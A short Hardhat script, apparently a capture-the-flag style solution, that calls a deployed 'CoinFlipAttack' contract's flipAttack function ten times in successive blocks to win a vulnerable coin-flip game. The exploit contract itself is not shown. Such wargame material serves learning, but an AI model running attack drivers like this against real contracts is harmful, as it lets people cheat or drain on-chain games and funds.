import { ethers } from 'hardhat';
// import hre
import hre from 'hardhat';

async function main() {
  const contractAddress = '0xb8e15583fB2E087B9212C97C95E7982e22f93BA5';
  const contract = await hre.ethers.getContractAt(
    'CoinFlipAttack',
    contractAddress
  );

  // Every block, for 10 blocks, the attack contract will call the flip function
  // on the CoinFlip contract
  for (let i = 0; i < 10; i++) {
    console.log(`Flipping coin ${i} times`);
    // Flip attack
    const flipAttack = await contract.flipAttack({ gasLimit: 100_000 });
    // Wait for the transaction to be mined in 1 block
    await flipAttack.wait(1);
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
